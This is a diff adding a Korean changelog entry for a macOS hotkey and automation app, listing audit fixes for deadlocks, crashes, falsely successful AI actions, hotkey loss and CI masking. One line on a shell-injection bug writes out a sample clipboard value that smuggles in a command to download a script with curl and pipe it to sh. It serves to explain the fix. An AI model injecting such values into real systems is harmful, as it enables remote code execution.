@@ -3,6 +3,42 @@
 > 형식: `{날짜} {platform} {error_code/부가} — 내용`
 > 프로젝트 전체 변경 내역은 이 파일에 기록합니다.
 
+## 2026-09-27 macos — 감사 결함 수정 (PLAN_v0.21)
+
+> 5개 계층 정밀 감사(실행 엔진 / 저장소 / AX·액션 / 핫키·자동화 / 문서 정합) 결과 25건 수정.
+> 테스트 171 → **247건 0실패**(2 skip). 새 회귀 테스트 76건. 빌드 경고 0. i18n ko/en 810키 일치.
+
+### P0 — 앱 정지 · 크래시 · 거짓 성공 · 데이터 소실
+
+- **E-MAC-SCRIPT-6004** — `waitUntilExit()` 후 `readDataToEndOfFile()` 순서로 4곳 동일 패턴. 파이프 버퍼(64KiB) 초과 시 자식이 write에서 블로크되어 부모가 종료 대기를 끝내지 않으므로 **영구 교착**. 핫키 경로가 메인 스레드라 교착 시 핫키·패널·메뉴바가 전부 정지했다(강제종료 외 복구 불가). 트리거: `cat 큰 로그`·`find /`·`adb logcat -d`·`curl`·`git log -p` → `ProcessRunner` 신규(종료 대기와 출력 드레인을 병렬 수행, 선택적 timeout + SIGTERM/SIGKILL 폴백)
+- **E-MAC-VAR-1002** — `String(Int(v))` 크래시. `inf`·`NaN`은 `v == v.rounded()`가 참이라 `Double→Int` fatalError가 났다. 도달 경로: `inferValue`의 `Double("inf")`·list/dictionary 재귀·디코딩된 blob → 2^53 미만 + 유한일 때만 변환
+- **E-MAC-AI-9013** — AI 3종이 FoundationModels를 호출하지 않으면서 `return true`를 반환했다. `useModel`은 입력 프롬프트를 그대로 출력 변수로 저장, `writingTool`은 "[Proofread] {원문}" 문자열 래핑, `imagePlayground`는 512×512 단색 사각형에 프롬프트를 그린 플레이스홀더를 tmp에 기록하고 "이미지 생성 완료"로 로그. `AIAvailabilityManager`도 macOS 26 이상이면 무조건 `.available`을 반환해 Apple Intelligence가 꺼진 기기에서도 "사용 가능"로 표시됐다 → 3종 모두 실패 반환, 가용성 판정 정직화, **공개 광고(README·랜딩 페이지) 정정**
+- **E-MAC-HTKEY-1003** — `setLaunchBinding`이 `removeBinding` **후** `addBinding`을 호출했고, `addBinding`은 중복 조합이면 조용히 `return`했다. 교체 실패 시 **작동하던 핫키만 사라진 채** 사용자에게 아무 신호가 없었다. 예약 핫키(⇧⌥A/⌘⌥K/⇧⌥S/⌘⇧↩)와 겹치면 발동 → 삭제 전 사전 검증. 동시에 `HotKeyRecorderView.onRecord`가 `(HotKeyCombo) -> Void`라 수락 여부를 표현할 수 없어 무조건 "적용되었습니다"를 표시하던 문제도 `String?` 반환으로 해결
+- **E-MAC-REL-9301** — `CFBundleShortVersionString`이 `1.0`으로 고정돼 있었고 `release.yml`의 태그-버전 대조가 `exit 1` 하므로 **다음 릴리스가 반드시 실패**했다. 근본 원인은 xcodegen이 매 빌드 Info.plist를 재생성해 1.3.0 범프가 되돌아간 것이었다 → `project.yml`의 `MARKETING_VERSION`을 단일 출처로 만들고 plist는 변수로 치환. `scripts/check-version.py` 게이트를 build/CI/release 3곳에 연결
+
+### P1 — 오동작 · 무음 실패
+
+- **E-MAC-SCRIPT-6004(인젝션)** — 셸 경로에 인용 처리가 아예 없었음(AppleScript 경로만 `appleScriptQuoted` 보유). `{clipboard}`에 `"; curl x.sh | sh; #`가 들어가면 실행 → `ShellEnvironment.literal` + `resolveText(escaping:)` 도입
+- **E-MAC-FLOW-7009** — 실행 결과 전파 4종 결함: ① `executeRepeatCount`/`Each`가 내부 `success:false`를 버리고 무조건 성공 반환 ② `execute(steps:)`가 `error` 문자열을 버려 구체적 원인 유실 ③ `stop`/`ended` 경로가 누적 실패를 삼킴 ④ 셸 단계가 stdout 대신 **스크립트 소스코드**를 출력 변수로 기록 ⑤ 일반 액션 `default:` 분기가 `setOutput` 자체를 호출하지 않음
+- **E-MAC-STORE-5007** — `removeApp`가 바인딩·Carbon 핫키를 남겼다. `pruneRemovedApps()`가 **매 실행** 호출되므로 **외장드라이브를 뽑으면** 앱은 목록에서 사라지는데 고아 핫키는 매번 재등록되어 죽은 bundleID로 실행을 시도했다
+- **E-MAC-STORE-5008** — `showHiddenApps`에 `didSet`·`PrefKeys`·복원이 모두 없어 설정 토글이 매 실행 리셋됐다
+- **E-MAC-UX-9011** — 테마 활성 ID 키 이중 정의(`ApexKeyActiveThemeId` vs `activeThemeId`)로 `loadActiveThemeId()`가 항상 nil, `loadActiveTheme()`는 죽은 경로, 활성 테마 삭제 시 참조 정리도 실행되지 않았다 → 단일 키로 통합
+- **E-MAC-AUTO-8002** — `FSEventStreamRelease`을 콜백 큐 동기화 없이 호출해 use-after-free 창이 열렸다 → 전용 큐를 static 관리하고 해제 전 barrier로 in-flight 콜백 대기
+- **E-MAC-MENU-7007** — 오류 분류가 실측과 달랐다. 없는 메뉴 항목·없는 메뉴바 항목·빈 세그먼트가 **전부 `-1728`**인데 `appNotRunning`은 `-600`에 연결돼 있어(실측으로 나타나지 않음) 도달 불가했고, `-1743`(Automation TCC 거부)은 "손쉬운 사용 권한 없음"으로 오표기됐다 → `.automationDenied` 분리
+- **E-MAC-MENU-7008** — `menuPath`가 빈 구 레거시 바인딩은 `click menu item "X" of menu 1 of menu bar item "X"`를 생성해 **구조적으로 100% 실패**했다. 게다가 `ApexKeyStoreTests`가 이 실패 경로를 의도된 동작으로 green 고정하고 있었다 → 최상위 메뉴 클릭으로 분기 + 테스트 갱신
+- **E-MAC-CAT-9401** — `ActionType` 153종 중 실제 실행은 28종(18%)인데 125종 미구현이 구분 없이 카탈로그에 노출됐다. 선택해도 빈 설정 창이 열리고 실행해야야 알 수 있었다 → `default:` 없이 153개를 전수 나열하는 switch 도입으로 **컴파일 타임 정합성** 확보. 카탈로그는 구현 완료분만 기본 노출, 나머지는 "준비 중"/"연동 미구현" 배지 + 선택 차단
+- **E-MAC-AUTO-8003** — 사이드바 배지와 브라우저 카드가 미구현 트리거 8종을 집계해 "배지 4 / 실제 등록 0" 상태가 가능했다 → 실제 등록 기준 집계. README가 광고하던 디스플레이·Wi-Fi·블루투스·앱 트리거 4종 정정
+- **E-MAC-SYS-8006** — `androidMirrorScriptPath`가 개발 머신 절대경로를 `preferred`로 하드코딩해 **앱 밖의 임의 파일을 실행**하고 스크립트 편집 저장 시 덮어썼다 → Application Support 경로만 사용
+- **T-164** — `build_and_run.sh test`의 smoke/unit/full 3분기가 완전히 동일했고, xcodebuild 실패가 `| tail`에 삼켜져 **항상 exit 0**으로 끝났다(CI가 통과한 것처럼 보이면서 테스트는 실패) → 실제 스코프 분리 + `PIPESTATUS` 전파. 시나리오 중 **없는 프로세스 osascript가 5.5초** 걸리는 것을 실측 발견해 데드라인을 5초→10초로 상향
+
+### 정리
+
+- 죽은 코드 6종 삭제 — `isUsableKeyCode`·`moveBinding`·`moveStep`+`MoveDirection`·`AutomationManager.stopAll`·`Result.stopped()` (모두 호출 0건 확인 후)
+- `applicationWillTerminate`가 로그만 남기던 문제 → `AutomationManager.unregisterAll` + `HotKeyService.unregisterAll` + `toastTimer` 정리 배선
+- 죽은 자산 — 미사용 스크립트 6개(`build_strings`·`comprehensive_replace`·`localize_all`·`replace_strings`×3), 시스템 탭 삭제 잔재 i18n 키 9건
+- `runsInBackground`가 12종 전부 `true`를 반환하던 판정 없는 속성 → `isWatcherSupported`를 따름
+- 문서 정정 — `docs/FUNCTIONAL_CHECKLIST.md` 전면 갱신(8개월 방치), `docs/TODO.md` 거짓 `[x]` 6건(T-036·T-132·T-135·L-09·R-04·U-17) 정정
+
 ## 2026-09-22 macos — 대형 파일 분할 + CI pipefail (PLAN_v0.20)
 
 > 테스트 171/0·빌드·현지화 게이트 통과 후 기록. 이동만, 동작 불변.
